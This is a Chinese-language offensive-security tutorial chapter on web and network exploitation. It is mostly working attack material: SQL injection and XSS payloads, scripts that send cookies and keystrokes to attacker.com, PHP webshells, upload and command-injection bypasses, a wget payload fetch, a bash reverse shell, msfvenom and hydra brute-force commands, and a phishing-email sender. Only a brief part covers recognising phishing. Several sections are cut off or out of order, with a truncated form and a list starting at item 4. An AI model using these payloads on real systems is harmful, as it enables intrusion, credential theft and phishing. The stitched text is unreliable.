## 3.1 漏洞利用

漏洞是网络攻击中最常用的突破手段，本节详细介绍常见漏洞类型及其利用方法。

### 3.1.1 SQL注入漏洞

**1. SQL注入原理**

SQL注入是因为应用程序对用户输入数据未做充分过滤或转义，直接拼接到SQL语句中执行，导致攻击者可以执行额外的SQL语句。

```sql
-- 正常查询
SELECT * FROM users WHERE username='admin' AND password='123456'

-- 注入后（绕过认证）
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password=''
```

**2. SQL注入类型**

| 类型 | 说明 | 利用难度 |
|------|------|----------|
| UNION注入 | 联合查询获取数据 | 简单 |
| 报错注入 | 利用错误信息获取数据 | 简单 |
| 布尔盲注 | 根据页面返回判断条件真假 | 中等 |
| 时间盲注 | 利用延时函数判断条件 | 中等 |
| 堆叠注入 | 执行多条SQL语句 | 简单 |
| 二次注入 | 存储型注入 | 复杂 |

**3. SQL注入实战技巧**

```sql
-- 判断注入点
' OR '1'='1
" OR "1"="1
') OR ('1')=('1

-- 判断字段数
ORDER BY 1
ORDER BY 2
...
ORDER BY N

-- UNION注入
UNION SELECT 1,2,3,4
UNION SELECT NULL,NULL,NULL

-- 获取数据库信息
UNION SELECT 1,version(),database(),4
UNION SELECT 1,user(),@@datadir,4

-- 获取表名
UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()

-- 获取列名
UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='admin'

-- 获取数据
UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM admin
```

**4. SQL注入绕过技巧**

```
常见绕过方法：

1. 注释符绕过
   admin'/**/OR/**/'1'='1

2. 大小写混合
   UniOn SeLeCt

3. URL编码
   %27 OR %271%27=%271

4. 宽字节注入
   admin%df' OR '1'='1

5. 空格过滤
   admin'/**/OR/**/'1'='1
   admin'%0aOR%0a'1'='1

6. 等号过滤
   admin' OR 1 LIKE 1
   admin' OR 1 REGEXP 1
```

### 3.1.2 跨站漏洞（XSS）

**1. XSS漏洞原理**

XSS（Cross-Site Scripting）跨站脚本攻击是因为Web应用对用户输入的数据没有进行充分的过滤或转义，导致恶意脚本被浏览器解析执行。

```html
<!-- 反射型XSS -->
<img src=x onerror="alert(document.cookie)">

<!-- 存储型XSS -->
<script>fetch('http://attacker.com?c='+document.cookie)</script>

<!-- DOM型XSS -->
<script>document.write(location.hash)</script>
```

**2. XSS利用方式**

```javascript
// 窃取Cookie
var img = document.createElement('img');
img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
document.body.appendChild(img);

// 键盘记录
document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
});

// 钓鱼攻击
document.body.innerHTML = '<form action="http://attacker.com"><input type="password"/></form>';
```

**3. XSS绕过技巧**

```
1. 大小写混合
   <ScRiPt>alert(1)</sCrIpT>

2. HTML标签绕过
   <img src=x onerror=alert(1)>
   <svg onload=alert(1)>
   <body onload=alert(1)>

3. 事件绕过
   onclick=alert(1)
   onerror=alert(1)
   onload=alert(1)

4. URL编码绕过
   javascript:alert%281%29

5. Data URI绕过
   data:text/html,<script>alert(1)</script>
```

### 3.1.3 文件上传或下载漏洞

**1. 文件上传漏洞原理**

文件上传功能未对上传文件类型和内容进行严格限制，导致攻击者可以上传恶意文件（WebShell）并执行。

```php
<?php
// 恶意上传文件
$filename = $_FILES['upload']['name'];
move_uploaded_file($_FILES['upload']['tmp_name'], "uploads/" . $filename);
?>
```

**2. WebShell上传利用**

```php
<?php
// 简单WebShell
eval($_POST['cmd']);
?>

<?php
// 一句话木马
assert($_POST['x']);
?>

<?php
// 冰蝎WebShell
@eval(base64_decode($_POST['pass']));
?>
```

**3. 文件上传绕过技巧**

```
1. 前端验证绕过
   - 修改JavaScript验证
   - 禁用JS后上传

2. MIME类型绕过
   Content-Type: image/jpeg

3. 文件扩展名绕过
   - 大小写：.pHp
   - 双写：.phphpp
   - 特殊扩展名：.php5, .phtml, .phar

4. 文件内容绕过
   - 添加文件头：GIF89a
   - 图片马：copy 1.jpg/b + shell.php/a webshell.jpg
   - 竞争上传

5. 解析漏洞
   - Apache: shell.php.xxx
   - Nginx: shell.jpg/.php
   - IIS: shell.asp;1.jpg
```

### 3.1.4 命令执行漏洞

**1. 命令执行漏洞原理**

应用程序将用户输入拼接到系统命令中执行，未做充分过滤。

```php
<?php
// 危险代码
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
?>
```

**2. 命令执行利用**

```bash
# Linux命令注入
# 触发点
ping -c 4 127.0.0.1;whoami
ping -c 4 127.0.0.1|cat /etc/passwd
ping -c 4 127.0.0.1`whoami`
ping -c 4 $(whoami)

# Windows命令注入
ping -n 4 127.0.0.1&whoami
ping -n 4 127.0.0.1|type C:\\windows\\win.ini
```

**3. 命令执行利用方式**

```bash
# 写入WebShell
echo '<?php eval($_POST[x]);?>' > shell.php

# 下载远程文件
wget http://attacker.com/shell.php

# 反弹Shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# 使用Metasploit
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf > shell.elf
```

### 3.2.1 弱口令

**1. 弱口令类型**

```
常见弱口令模式：

1. 简单数字/字母组合
   123456, password, abc123

2. 键盘顺序
   qwerty, asdfgh, 1qaz2wsx

3. 公司/产品名称+数字
   company123, product2020

4. 生日/纪念日
   19900101, 0521

5. 常见英文单词
   admin, welcome, letmein

6. 社工密码
   姓名+生日, 手机号
```

**2. 弱口令利用**

```bash
# SSH弱口令
hydra -l root -P passwords.txt ssh://target.com

# RDP弱口令
hydra -l administrator -P passwords.txt rdp://target.com

# FTP弱口令
hydra -l ftp -P passwords.txt ftp://target.com

# MySQL弱口令
hydra -l root -P passwords.txt mysql://target.com

# 使用用户名字典

```

### 3.2.2 口令复用

**1. 口令复用场景**

```
口令复用发生场景：

1. 同一密码用于多个系统
   - OA系统密码 = 服务器密码
   - 邮箱密码 = VPN密码

2. 不同系统密码规律相同
   - 旧密码 + @2024
   - company + 年份

3. 密码文件复用
   - Windows: SAM, SYSTEM
   - Linux: /etc/shadow
```

**2. 口令复用利用**


**2. 钓鱼页面制作**

```html

    <input type="password" name="password" placeholder="密码">
    <button type="submit">登录</button>
</form>
```

**3. 钓鱼邮件发送**

```python
# 使用Python发送钓鱼邮件
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

msg = MIMEMultipart()
msg['From'] = 'it-security@company.com'
msg['To'] = 'target@victim.com'
msg['Subject'] = 'IT安全升级通知'

body = """
尊敬的用户：
请在24小时内更新您的密码。
<a href="http://钓鱼域名/login">立即更新</a>
"""

msg.attach(MIMEText(body, 'html'))

# 发送邮件
with smtplib.SMTP('smtp.company.com', 25) as server:
    server.login('it-security@company.com', 'password')
    server.send_message(msg)
```

### 3.3.3 钓鱼应急措施

**1. 钓鱼识别方法**

```
钓鱼邮件特征：

1. 发件人地址异常
   - 与真实地址相似但不同
   - 域名拼写错误
   - 免费邮箱发送

2. 内容特征
   - 紧迫感（24小时内）
   - 威胁语气
   - 语法错误
   - 链接与显示不符

3. 附件特征
   - 可执行文件
   - Office宏文档
   - 压缩包内含exe
```

**2. 钓鱼处置流程**

```markdown
钓鱼邮件处置：

1. 识别
   - 检查发件人地址
   - 不点击可疑链接
   - 不下载可疑附件

2. 报告
   - 立即报告安全团队
   - 保存邮件原文
   - 记录相关人员

3. 处置
   - 隔离受感染主机
   - 更改相关账号密码
   - 排查是否中招
```

4. **供应链攻击**：针对第三方的攻击
5. **VPN仿冒接入**：利用VPN漏洞或账号接入
6. **隐蔽隧道外连**：DNS、ICMP、HTTP隧道
7. **社会工程学攻击**：利用人性弱点
8. **近源攻击**：物理接近的攻击

这些攻击手段往往需要组合使用，形成完整的攻击链。
